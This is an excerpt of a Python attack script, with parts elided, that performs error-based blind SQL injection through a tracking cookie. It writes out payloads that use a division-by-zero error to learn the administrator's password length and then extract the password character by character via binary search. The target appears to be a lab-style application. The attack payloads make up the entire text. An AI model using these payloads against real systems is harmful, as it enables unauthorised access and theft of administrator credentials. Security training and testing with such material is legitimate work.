...
def determine_password_length(tracking_id, session_id):
	password_length = 0
	for i in range(1, 40):
		payload = "'|| (SELECT CASE WHEN (LENGTH(password)={l}) THEN to_char(3/0) ELSE '' END FROM users where username='administrator') ||'".format(l=i)
		payloaded_cookie = make_cookie(tracking_id, session_id, payload)
		if (error_triggered(payloaded_cookie)):
			password_length = i
			break
...
def determine_password(tracking_id, session_id, password_length):
	...
	for i in range(0, password_length):
		...
		while(True):
			...
			payload = "'||(SELECT CASE WHEN SUBSTR(password,{i},1) > '{c}' THEN to_char(5/0) ELSE '' END FROM users where username='administrator')||'".format(i=i+1,c=c)
			payloaded_cookie = make_cookie(tracking_id, session_id, payload)
			if (error_triggered(payloaded_cookie)):
				if (right_size > 1):
					dt.dict = dt.right
